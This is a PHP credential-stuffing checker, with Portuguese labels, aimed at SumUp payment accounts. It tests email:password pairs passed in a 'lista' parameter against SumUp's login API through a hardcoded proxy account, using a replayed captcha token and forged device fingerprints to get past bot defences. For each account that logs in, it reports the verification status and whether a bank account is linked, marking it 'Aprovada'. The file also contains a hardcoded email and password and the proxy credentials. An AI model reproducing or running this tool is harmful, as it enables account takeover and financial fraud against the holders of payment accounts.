<?php 

set_time_limit(0);
error_reporting(0);

function multiexplode($delimiters, $string){
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$url = 'https://me.sumup.com/login/';
$lista = $_GET['lista'];
$email = multiexplode(array(":", "|", ""), $lista)[0];
$senha = multiexplode(array(":", "|", ""), $lista)[1];

function GetStr($string, $start, $end){
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function requisicao($url, $post = '', $cabecalho = ''){
    ob_start();
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
	curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'xnzxlsng-dest:mrje0k2dtvzp');
      curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_VERBOSE, true);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
        if($post){
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }else if (empty($post)){
             curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
         }
        if($cabecalho){
            curl_setopt($ch, CURLOPT_HTTPHEADER, $cabecalho);
        }
    $requisicao = curl_exec($ch);
        $req_erno = curl_errno($ch);
        $req_erro = curl_error($ch);
            if($req_erno > 0){
                die("A requisição retornou o erro ($req_erno): $req_erro \n.");
            }
    return $requisicao;
    ob_end_flush();

}
$email = 'dndsza3@gmail.com';
$senha ='camren123';

$s = requisicao('https://me.sumup.com/api/oauth', '{"username":"'.$email.'","password":"'.$senha.'","locale":"pt-BR","captchaToken":"03AGdBq247dwhdZ_vkEPjhswSgeV8O3oqWpe49fNeDNdXFM5f8Fa4DTmOcaN3PP1hHQtn8PiVdy7rt_srMgcDJRp3Rc6JB7T8vLdFAYtwiz221Zo4FBPUp7ufR110DBaHRA4vFm8E1NtYUR1O3qEAYm1VMbGJbml2G04sn9ndAzSTt9b_ogU2uIKdgvepguNdTohsabEqYQe7_BiY-V3fCgNHcRV-LTIU9PhBjh2FBqGs_zNta-1h-wdOg8UoBn4cryHXOzv0riLBcBz22p80kHy5y1_pvL3cAUsKsrDCQHo2rdSXn2W1iRKveh45tpWocaXu3OU8iwQgBomco1rgGW4WjA_zMLllDe5Awx_qItEbz1PIg83Qv_v5ZTFaq13mGE26lXOv8B3_I0hMlScmDcVy9S6Hx4_AWK42TAvEEsj8Q3hymMnjA_UMYfwxBLhgNMZSi0Bo74A2Q8EV-v47LNVAZKBtSyMbXCeLXQ9XmuF7WKfl4RzRm0dQ_6Jd6U5zjGIsrExYi--t-A2PAnIOpGGpyEIzkIFnKfA"}', array(
'accept: application/json, text/plain, */*',
'content-type: application/json;charset=UTF-8',
'x-device-fingerprint: eyJkZXZpY2VJZCI6ImFkYmMzYjJjLWU2ODItNDE4MS04YWVhLTcwNjdhNzc0YzFiMCIsImNvbXBvbmVudHMiOlt7ImtleSI6InVzZXJfYWdlbnQiLCJ2YWx1ZSI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84Ny4wLjQyODAuNjcgU2FmYXJpLzUzNy4zNiJ9LHsia2V5IjoibGFuZ3VhZ2UiLCJ2YWx1ZSI6InB0LUJSIn0seyJrZXkiOiJjb2xvcl9kZXB0aCIsInZhbHVlIjoyNH0seyJrZXkiOiJkZXZpY2VfbWVtb3J5IiwidmFsdWUiOjR9LHsia2V5IjoiaGFyZHdhcmVfY29uY3VycmVuY3kiLCJ2YWx1ZSI6NH0seyJrZXkiOiJyZXNvbHV0aW9uIiwidmFsdWUiOlsxOTIwLDEwODBdfSx7ImtleSI6ImF2YWlsYWJsZV9yZXNvbHV0aW9uIiwidmFsdWUiOlsxOTIwLDEwNDBdfSx7ImtleSI6InRpbWV6b25lX29mZnNldCIsInZhbHVlIjoxODB9LHsia2V5Ijoic2Vzc2lvbl9zdG9yYWdlIiwidmFsdWUiOjF9LHsia2V5IjoibG9jYWxfc3RvcmFnZSIsInZhbHVlIjoxfSx7ImtleSI6ImluZGV4ZWRfZGIiLCJ2YWx1ZSI6MX0seyJrZXkiOiJvcGVuX2RhdGFiYXNlIiwidmFsdWUiOjF9LHsia2V5IjoiY3B1X2NsYXNzIiwidmFsdWUiOiJ1bmtub3duIn0seyJrZXkiOiJuYXZpZ2F0b3JfcGxhdGZvcm0iLCJ2YWx1ZSI6IldpbjMyIn0seyJrZXkiOiJ3ZWJnbF92ZW5kb3IiLCJ2YWx1ZSI6Ikdvb2dsZSBJbmMufkFOR0xFIChJbnRlbChSKSBIRCBHcmFwaGljcyA1MjAgRGlyZWN0M0QxMSB2c181XzAgcHNfNV8wKSJ9LHsia2V5IjoiYWRibG9jayIsInZhbHVlIjpmYWxzZX0seyJrZXkiOiJoYXNfbGllZF9sYW5ndWFnZXMiLCJ2YWx1ZSI6ZmFsc2V9LHsia2V5IjoiaGFzX2xpZWRfcmVzb2x1dGlvbiIsInZhbHVlIjpmYWxzZX0seyJrZXkiOiJoYXNfbGllZF9vcyIsInZhbHVlIjpmYWxzZX0seyJrZXkiOiJoYXNfbGllZF9icm93c2VyIiwidmFsdWUiOmZhbHNlfSx7ImtleSI6InRvdWNoX3N1cHBvcnQiLCJ2YWx1ZSI6WzAsZmFsc2UsZmFsc2VdfSx7ImtleSI6ImhhcmR3YXJlSGFzaCIsInZhbHVlIjoiZmQzNGMyZjk3MzhjMGMyYzY4MTllN2UxNDk4NWFhMDBiOGNjNzhjYiJ9LHsia2V5IjoicmVhbElwIiwidmFsdWUiOiIxNzcuMTg2Ljk1LjY4In0seyJrZXkiOiJyb3V0ZSIsInZhbHVlIjoiMTc3LjE4Ni45NS42OCJ9LHsia2V5IjoibG9jYWxJUCJ9LHsia2V5IjoidHJhY2tpbmdDb29raWUifSx7ImtleSI6Im5ld0Nvb2tpZSIsInZhbHVlIjpmYWxzZX0seyJrZXkiOiJkZXZpY2VJZCIsInZhbHVlIjoiZTczODBjZTU1Y2ZjZmUwNTc2N2NmMmUxMjBhYmNkYTMifSx7ImtleSI6InJlYWxJcCIsInZhbHVlIjoiMTc3LjE4Ni45NS42OCJ9LHsia2V5Ijoicm91dGUiLCJ2YWx1ZSI6IjE3Ny4xODYuOTUuNjgifSx7ImtleSI6ImxvY2FsSVAifSx7ImtleSI6InRyYWNraW5nQ29va2llIn0seyJrZXkiOiJuZXdDb29raWUiLCJ2YWx1ZSI6ZmFsc2V9LHsia2V5IjoiZGV2aWNlSWQiLCJ2YWx1ZSI6IjI0M2Q1OGE3M2Y3MjYxOTcyZDY1MzBiMTgzYzgwZGM3In0seyJrZXkiOiJyZWFsSXAiLCJ2YWx1ZSI6IjE3Ny4xODYuOTUuNjgifSx7ImtleSI6InJvdXRlIiwidmFsdWUiOiIxNzcuMTg2Ljk1LjY4In0seyJrZXkiOiJsb2NhbElQIn0seyJrZXkiOiJ0cmFja2luZ0Nvb2tpZSJ9LHsia2V5IjoibmV3Q29va2llIiwidmFsdWUiOmZhbHNlfSx7ImtleSI6ImRldmljZUlkIiwidmFsdWUiOiI1YzA5YTQyMjU0OTIzZmQxM2RhOWJhNzViNDllNWEzMSJ9XX0=',
'x-xsrf-token: 651af41b74843162'
));

if(strpos($s, 'LOGIN_SUCCESSFUL')){
    $p = requisicao('https://me.sumup.com/api/v0.1/me?include[]=permissions', '', array(
         "Host: me.sumup.com",
         "Connection: keep-alive",
         "Accept: application/json, text/plain, */*", 
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36", 
         "Sec-Fetch-Site: same-origin", 
         "Sec-Fetch-Mode: cors", 
         "Sec-Fetch-Dest: empty",
         "Referer: https://me.sumup.com/pt-br/account", 
         "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", 
    ));

    $xrftoken = GetStr($p, 'set-cookie: XSRF-TOKEN=', ';');

    $pz = requisicao('https://me.sumup.com/api/v0.1/me?include[]=permissions', '', array(
        "Host: me.sumup.com", 
        "Connection: keep-alive", 
        "Accept: application/json, text/plain, */*", 
        "X-XSRF-TOKEN: $xrftoken", 
        "X-Device-Fingerprint: eyJkZXZpY2VJZCI6ImY2ZGVlMTc5LWNhNGUtNDllYy05NTVkLTYwZjU1Zjc0NjI2MyIsImNvbXBvbmVudHMiOlt7ImtleSI6InVzZXJfYWdlbnQiLCJ2YWx1ZSI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84Ni4wLjQyNDAuMTgzIFNhZmFyaS81MzcuMzYifSx7ImtleSI6Imxhbmd1YWdlIiwidmFsdWUiOiJwdC1CUiJ9LHsia2V5IjoiY29sb3JfZGVwdGgiLCJ2YWx1ZSI6MjR9LHsia2V5IjoiZGV2aWNlX21lbW9yeSIsInZhbHVlIjo4fSx7ImtleSI6ImhhcmR3YXJlX2NvbmN1cnJlbmN5IiwidmFsdWUiOjh9LHsia2V5IjoicmVzb2x1dGlvbiIsInZhbHVlIjpbMTM2Niw3NjhdfSx7ImtleSI6ImF2YWlsYWJsZV9yZXNvbHV0aW9uIiwidmFsdWUiOlsxMzY2LDczOF19LHsia2V5IjoidGltZXpvbmVfb2Zmc2V0IiwidmFsdWUiOjB9LHsia2V5Ijoic2Vzc2lvbl9zdG9yYWdlIiwidmFsdWUiOjF9LHsia2V5IjoibG9jYWxfc3RvcmFnZSIsInZhbHVlIjoxfSx7ImtleSI6ImluZGV4ZWRfZGIiLCJ2YWx1ZSI6MX0seyJrZXkiOiJvcGVuX2RhdGFiYXNlIiwidmFsdWUiOjF9LHsia2V5IjoiY3B1X2NsYXNzIiwidmFsdWUiOiJ1bmtub3duIn0seyJrZXkiOiJuYXZpZ2F0b3JfcGxhdGZvcm0iLCJ2YWx1ZSI6IldpbjMyIn0seyJrZXkiOiJ3ZWJnbF92ZW5kb3IiLCJ2YWx1ZSI6Ikdvb2dsZSBJbmMufkFOR0xFIChJbnRlbChSKSBVSEQgR3JhcGhpY3MgNjIwIERpcmVjdDNEMTEgdnNfNV8wIHBzXzVfMCkifSx7ImtleSI6ImFkYmxvY2siLCJ2YWx1ZSI6ZmFsc2V9LHsia2V5IjoiaGFzX2xpZWRfbGFuZ3VhZ2VzIiwidmFsdWUiOmZhbHNlfSx7ImtleSI6Imhhc19saWVkX3Jlc29sdXRpb24iLCJ2YWx1ZSI6ZmFsc2V9LHsia2V5IjoiaGFzX2xpZWRfb3MiLCJ2YWx1ZSI6ZmFsc2V9LHsia2V5IjoiaGFzX2xpZWRfYnJvd3NlciIsInZhbHVlIjpmYWxzZX0seyJrZXkiOiJ0b3VjaF9zdXBwb3J0IiwidmFsdWUiOlswLGZhbHNlLGZhbHNlXX0seyJrZXkiOiJoYXJkd2FyZUhhc2giLCJ2YWx1ZSI6IjE5ZjJlYzgyNmRhOTk0MzU2ZmUwNjlmZmJlYmMxZDgwZGI4MTVhOGYifSx7ImtleSI6InJlYWxJcCIsInZhbHVlIjoiMjA0LjQ4LjIwLjI1NCJ9LHsia2V5Ijoicm91dGUiLCJ2YWx1ZSI6IjIwNC40OC4yMC4yNTQifSx7ImtleSI6ImxvY2FsSVAifSx7ImtleSI6InRyYWNraW5nQ29va2llIn0seyJrZXkiOiJuZXdDb29raWUiLCJ2YWx1ZSI6ZmFsc2V9LHsia2V5IjoiZGV2aWNlSWQiLCJ2YWx1ZSI6ImZhODllYmY1YzcyZjI5YzllNjU5M2RjZDc3ZmNkYTU5In0seyJrZXkiOiJyZWFsSXAiLCJ2YWx1ZSI6IjIwNC40OC4yMC4yNTQifSx7ImtleSI6InJvdXRlIiwidmFsdWUiOiIyMDQuNDguMjAuMjU0In0seyJrZXkiOiJsb2NhbElQIn0seyJrZXkiOiJ0cmFja2luZ0Nvb2tpZSJ9LHsia2V5IjoibmV3Q29va2llIiwidmFsdWUiOmZhbHNlfSx7ImtleSI6ImRldmljZUlkIiwidmFsdWUiOiIzYjkzNWEwY2I3MDY5YTgyNzJiMDg0OGM3MmJhNDI5YyJ9XX0=", 
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36", 
        "Sec-Fetch-Site: same-origin", 
        "Sec-Fetch-Mode: cors", 
        "Sec-Fetch-Dest: empty", 
        "Referer: https://me.sumup.com/api/v0.1/me?include[]=permissions", 
        "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" 
    ));

    $rp = requisicao('https://me.sumup.com/api/v0.1/me/risk-profile', '', array(
        "Host: me.sumup.com", 
        "Connection: keep-alive", 
        "Accept: application/json, text/plain, */*", 
        "X-XSRF-TOKEN: $xrftoken", 
        "X-Device-Fingerprint: eyJkZXZpY2VJZCI6ImQ4ZDJhODk2LTRiMTEtNDAyNi1iMzJmLTU5YjZhNDA4OTZhMiIsImNvbXBvbmVudHMiOlt7ImtleSI6InVzZXJfYWdlbnQiLCJ2YWx1ZSI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84Ni4wLjQyNDAuMTgzIFNhZmFyaS81MzcuMzYifSx7ImtleSI6Imxhbmd1YWdlIiwidmFsdWUiOiJwdC1CUiJ9LHsia2V5IjoiY29sb3JfZGVwdGgiLCJ2YWx1ZSI6MjR9LHsia2V5IjoiZGV2aWNlX21lbW9yeSIsInZhbHVlIjo4fSx7ImtleSI6ImhhcmR3YXJlX2NvbmN1cnJlbmN5IiwidmFsdWUiOjR9LHsia2V5IjoicmVzb2x1dGlvbiIsInZhbHVlIjpbMTM2Niw3NjhdfSx7ImtleSI6ImF2YWlsYWJsZV9yZXNvbHV0aW9uIiwidmFsdWUiOlsxMzY2LDcyOF19LHsia2V5IjoidGltZXpvbmVfb2Zmc2V0IiwidmFsdWUiOjE4MH0seyJrZXkiOiJzZXNzaW9uX3N0b3JhZ2UiLCJ2YWx1ZSI6MX0seyJrZXkiOiJsb2NhbF9zdG9yYWdlIiwidmFsdWUiOjF9LHsia2V5IjoiaW5kZXhlZF9kYiIsInZhbHVlIjoxfSx7ImtleSI6Im9wZW5fZGF0YWJhc2UiLCJ2YWx1ZSI6MX0seyJrZXkiOiJjcHVfY2xhc3MiLCJ2YWx1ZSI6InVua25vd24ifSx7ImtleSI6Im5hdmlnYXRvcl9wbGF0Zm9ybSIsInZhbHVlIjoiV2luMzIifSx7ImtleSI6IndlYmdsX3ZlbmRvciIsInZhbHVlIjoiR29vZ2xlIEluYy5+QU5HTEUgKFZNd2FyZSBTVkdBIDNEIERpcmVjdDNEMTEgdnNfNF8xIHBzXzRfMSkifSx7ImtleSI6ImFkYmxvY2siLCJ2YWx1ZSI6dHJ1ZX0seyJrZXkiOiJoYXNfbGllZF9sYW5ndWFnZXMiLCJ2YWx1ZSI6ZmFsc2V9LHsia2V5IjoiaGFzX2xpZWRfcmVzb2x1dGlvbiIsInZhbHVlIjpmYWxzZX0seyJrZXkiOiJoYXNfbGllZF9vcyIsInZhbHVlIjpmYWxzZX0seyJrZXkiOiJoYXNfbGllZF9icm93c2VyIiwidmFsdWUiOmZhbHNlfSx7ImtleSI6InRvdWNoX3N1cHBvcnQiLCJ2YWx1ZSI6WzAsZmFsc2UsZmFsc2VdfSx7ImtleSI6ImhhcmR3YXJlSGFzaCIsInZhbHVlIjoiMTlmMmVjODI2ZGE5OTQzNTZmZTA2OWZmYmViYzFkODBkYjgxNWE4ZiJ9LHsia2V5IjoicmVhbElwIiwidmFsdWUiOiIxODcuNjEuMTExLjEwIn0seyJrZXkiOiJyb3V0ZSIsInZhbHVlIjoiMTg3LjYxLjExMS4xMCJ9LHsia2V5IjoibG9jYWxJUCJ9LHsia2V5IjoidHJhY2tpbmdDb29raWUiLCJ2YWx1ZSI6IjNkMTIzYWNhLTQxZWYtNGZlZS1hYjFiLWJmODFmZWJiZDYwZCJ9LHsia2V5IjoibmV3Q29va2llIiwidmFsdWUiOnRydWV9LHsia2V5IjoiZGV2aWNlSWQiLCJ2YWx1ZSI6Ijk5N2VmZDNlOWQzZTI0YTA4NDYzZWQ5MDFiNTU5MGNlIn0seyJrZXkiOiJyZWFsSXAiLCJ2YWx1ZSI6IjE4Ny42MS4xMTEuMTAifSx7ImtleSI6InJvdXRlIiwidmFsdWUiOiIxODcuNjEuMTExLjEwIn0seyJrZXkiOiJsb2NhbElQIn0seyJrZXkiOiJ0cmFja2luZ0Nvb2tpZSIsInZhbHVlIjoiMzdiZGRiNWQtMzIwNS00ZGE1LWE0OGItNTE2NzgxZjE4ZmY5In0seyJrZXkiOiJuZXdDb29raWUiLCJ2YWx1ZSI6dHJ1ZX0seyJrZXkiOiJkZXZpY2VJZCIsInZhbHVlIjoiZTQ5NGJjMzZjYzY3NDNkYzE4ZmE4MjRjNzI5ZGI0ZDIifV19", 
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",
        "Sec-Fetch-Site: same-origin",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty", 
        "Referer: https://me.sumup.com/pt-br/login/?_ga=2.110964677.1782917362.1605111404-958053733.1605111404", 
        "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" 
    ));

    $estado = GetStr($rp, 'state":"', '"');
    if($estado = 'PENDING'){
        $estado = "<span class='badge badge-danger'>Não verificada</span>";
    }else{
        $estado = "<span class='badge badge-success'>Verificada</span>";
    }
    
    $lara = GetStr($rp, 'bank_account":{"complete":', '"');
    if($lara = 'false'){
        $lara = "<span class='badge badge-success'>Sem lara cadastrada</span>";
    }else{
        $lara = "<span class='badge badge-danger'>Lara cadastrada</span>";
    }

    echo "<span class='badge badge-success'>Aprovada</span> ".$email."|".$senha." <span class='badge badge-info'> Situação: </span>&nbsp $estado <span class='badge badge-info'> Banco: </span>&nbsp $lara <span class='badge badge-success'>@ligeironato 🏄 </span>  <br>";

}elseif(strpos($s, '403')){
    echo "<span class='badge badge-danger'>#REPROVADA</span> ".$email." | ".$senha." Proxy Die<br>";
}else{
    echo "<span class='badge badge-danger'>#REPROVADA</span> ".$email." | ".$senha."<br>";
}




if(file_exists(getcwd().'/cookies.txt')){
    unlink(getcwd().'/cookies.txt');
    unlink('/cookies.txt');
    unlink('cookies.txt');
}
